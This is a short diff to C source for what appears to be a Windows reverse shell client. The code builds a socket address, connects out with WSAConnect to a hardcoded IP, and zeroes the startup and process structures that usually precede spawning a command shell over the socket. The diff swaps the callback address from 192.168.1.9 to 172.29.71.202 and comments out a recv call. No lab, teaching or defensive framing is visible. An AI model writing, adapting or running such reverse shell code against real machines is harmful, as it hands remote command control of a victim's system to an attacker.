@@ -22,15 +22,15 @@
 
         shell_addr.sin_port = htons(port);
         shell_addr.sin_family = AF_INET;
-        
-        shell_addr.sin_addr.s_addr = inet_addr("192.168.1.9");
+
+        shell_addr.sin_addr.s_addr = inet_addr("172.29.71.202");
 
         connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
         if (connection == SOCKET_ERROR) {
             printf("[!] Connect to target server failed, please try again.\n");
             exit(0);
         } else {
-            recv(shell, RecvServer, sizeof(RecvServer), 0);
+            // recv(shell, RecvServer, sizeof(RecvServer), 0);
             ZeroMemory(&si, sizeof(si));
             si.cb = sizeof(si);
             ZeroMemory(&pi, sizeof(pi));
